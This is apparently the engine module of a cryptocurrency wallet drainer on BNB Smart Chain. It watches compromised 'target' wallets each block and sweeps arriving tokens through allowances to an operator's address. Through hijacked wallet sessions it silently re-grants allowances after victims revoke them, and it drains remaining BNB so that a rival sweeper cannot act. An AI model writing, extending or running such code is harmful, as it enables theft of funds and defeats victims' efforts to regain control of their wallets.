import { createPublicClient, webSocket, formatUnits, parseUnits } from 'viem';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';
import { NATIVE } from '../config/constants';
import { listActive, setAllowanceOk, type Target } from './storage';
import { pullone, balanceOf, allowanceOf, gasOf } from './puller';
import { grantAllowance, status, address, txLock, sendMax } from './baw';
import { getRouter } from './router';
import { notify } from './notify';

const pub = createPublicClient({ chain: bsc, transport: webSocket(ENV.WSS_URLS[0]) });

const cache = new Map<string, Target>();
const inflight = new Set<string>();
const lastFired = new Map<string, number>();
const lastBal = new Map<string, bigint>();
const lastReapprove = new Map<string, number>();
const orphanWarned = new Set<string>();
const sessionOk = new Map<string, number>();

export const engineState = { armed: false, targets: 0, blocks: 0, lastBlock: 0, startedAt: 0 };

const COOLDOWN_MS = 1_500;
const MAX_TRIES = 3;
const REAPPROVE_COOLDOWN = 5 * 60_000;
const LOW_ALLOWANCE = parseUnits('10', 18);
const MIN_SWEEP = parseUnits('5', 18);

const sref = (t: Target) => ({ dir: `t${t.target}`, instanceId: t.instanceId! });

async function refresh() {
  try {
    const rows = await listActive();
    cache.clear();
    for (const r of rows) cache.set(r.target, r);
    engineState.targets = rows.length;

    for (const r of rows) {
      if (!r.puller && !orphanWarned.has(r.target)) {
        orphanWarned.add(r.target);
        await notify(r.userId, `<code>${r.target}</code> has no puller.\nSend <code>/repair ${r.target} ${r.destination}</code>`);
      }
      if (r.puller) orphanWarned.delete(r.target);
    }
  } catch (e: any) { console.error('[engine] refresh', e.message); }
}

async function sessionLive(t: Target) {
  if (!t.instanceId) return false;
  if (Date.now() - (sessionOk.get(t.target) ?? 0) < 10_000) return true;
  try {
    const s = sref(t);
    const [st, ad] = await Promise.all([status(s), address(s)]);
    const hit = ad.data.addresses.find(a => a.binanceChainId === '56');
    if (st.data.status !== 'CONNECTED' || hit?.address.toLowerCase() !== t.target.toLowerCase()) return false;
    sessionOk.set(t.target, Date.now());
    return true;
  } catch { return false; }
}

/** Silent allowance top-up after a revoke. Needs a live session. */
async function reapprove(t: Target, token: `0x${string}`) {
  const key = `${t.target}:${token}`;
  if (Date.now() - (lastReapprove.get(key) ?? 0) < REAPPROVE_COOLDOWN) return;
  lastReapprove.set(key, Date.now());

  if (!(await sessionLive(t))) {
    await notify(t.userId,
      `🔑 Allowance for <code>${token}</code> is gone and the session is dead.\n` +
      `Revoke in the App, then send <code>/reapprove ${t.target}</code>`);
    return;
  }
  try {
    await grantAllowance(sref(t), token, t.target);
    const tok = t.tokens.find(x => x.token === token);
    if (tok) await setAllowanceOk(tok.id, true);
    console.log(`[reapprove] ${token} @ ${t.target}`);
    if (ENV.ADMIN_ID) await notify(ENV.ADMIN_ID, `♻️ Re-approved <code>${token}</code> on <code>${t.target}</code>`);
  } catch (e: any) {
    console.error(`[reapprove] ${t.target}: ${String(e.message || e).slice(0, 140)}`);
  }
}

async function checkAllowances(t: Target) {
  const router = getRouter();
  if (!router || !t.puller) return;
  for (const tok of t.tokens) {
    try {
      const allow = await allowanceOf(t.target, router, tok.token);
      const ok = allow > 0n;
      if (ok !== tok.allowanceOk) await setAllowanceOk(tok.id, ok);
      if (allow < LOW_ALLOWANCE) await reapprove(t, tok.token);
    } catch { /* transient */ }
  }
}

async function tryPull(t: Target, token: `0x${string}`) {
  const k = `pull:${t.target}:${token}`;
  if (inflight.has(k)) return;
  if (Date.now() - (lastFired.get(k) ?? 0) < COOLDOWN_MS) return;
  if (!t.puller || !t.pullerKey) return;

  inflight.add(k);
  lastFired.set(k, Date.now());
  try {
    for (let i = 1; i <= MAX_TRIES; i++) {
      try {
        const res = await pullone(t.pullerKey, t.target, t.destination, token);
        if (res && ENV.ADMIN_ID) {
          await notify(ENV.ADMIN_ID,
            `✅ <b>Swept</b> u<code>${t.userId}</code>\n<code>${t.target}</code> → <code>${t.destination}</code>\n` +
            `Amount <code>${formatUnits(res.amount, 18)}</code> fee <code>${formatUnits(res.feeAmount, 18)}</code>\n` +
            `Tx <code>${res.hashUser}</code>`);
        }
        return;
      } catch (e: any) {
        const m = String(e.message || e);
        console.error(`[pull ${i}] ${token} @ ${t.target}: ${m}`);
        if (m.includes('ALLOWANCE_ZERO')) { await reapprove(t, token); return; }
        if (m.includes('PULLER_LOW_GAS')) { await notify(t.userId, `⛽ Puller <code>${t.puller}</code> out of BNB.`); return; }
        if (m.includes('ROUTER_NOT_CONFIGURED')) return;
      }
      await new Promise(r => setTimeout(r, 200));
    }
  } finally { inflight.delete(k); }
}

/** BNB leg — takes leftover gas so the other bot can't restart. */
async function bnbLeg(t: Target) {
  if (!(await sessionLive(t))) return;
  const k = `bnb:${t.target}`;
  if (inflight.has(k)) return;
  inflight.add(k);
  try {
    const { data } = await txLock(sref(t));
    if (data.status === 'LOCKED') return;
    await sendMax(sref(t), NATIVE, t.destination);
    console.log(`[BNB LEG] ${t.target}`);
  } catch (e: any) {
    console.error(`[bnb] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
  } finally { inflight.delete(k); }
}

async function scan(t: Target) {
  for (const tok of t.tokens) {
    const bal = await balanceOf(t.target, tok.token);
    const key = `${t.target}:${tok.token}`;
    const prev = lastBal.get(key) ?? 0n;
    lastBal.set(key, bal);
    if (bal >= MIN_SWEEP && bal > prev) {
      console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
      void tryPull(t, tok.token);
      if (tok.token.toLowerCase() === ENV.USDT) setTimeout(() => { void bnbLeg(t); }, 1_200);
    }
  }
}

async function monitorRpcs() {
  if (!ENV.ADMIN_ID) return;
  for (const url of ENV.HTTP_URLS) {
    try {
      await createPublicClient({ chain: bsc, transport: webSocket(ENV.WSS_URLS[0]) }).getBlockNumber();
    } catch { /* ignore */ }
    try {
      const { createPublicClient: c, http: h } = await import('viem');
      await c({ chain: bsc, transport: h(url, { timeout: 5_000 }) }).getBlockNumber();
    } catch (e: any) {
      const m = String(e.message || e);
      console.error(`[RPC FAIL] ${url} -> ${m}`);
      if (/429|403|limit|exceeded|quota/i.test(m)) {
        await notify(ENV.ADMIN_ID, `🚨 <b>RPC key exhausted</b>\n<code>${url}</code>\n<code>${m.slice(0, 200)}</code>`);
      }
    }
  }
}

/**
 * Allowance engine. Inert unless ENABLE_PULLER=true.
 * Hijack mode does not need it — the hijack watcher runs separately.
 */
export async function startEngine() {
  engineState.startedAt = Date.now();
  await refresh();
  setInterval(refresh, 4_000);
  setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 120_000);
  setInterval(monitorRpcs, 600_000);

  let chain: Promise<unknown> = Promise.resolve();
  pub.watchBlocks({
    onBlock: (b) => {
      engineState.blocks++;
      engineState.lastBlock = Number(b.number ?? 0);
      chain = chain.then(() => Promise.allSettled([...cache.values()].map(t => scan(t))))
        .catch(e => console.error('[cycle]', e.message));
    },
  });
  engineState.armed = true;
  console.log(`[engine] ARMED — ${cache.size} target(s)`);
}

export { gasOf };
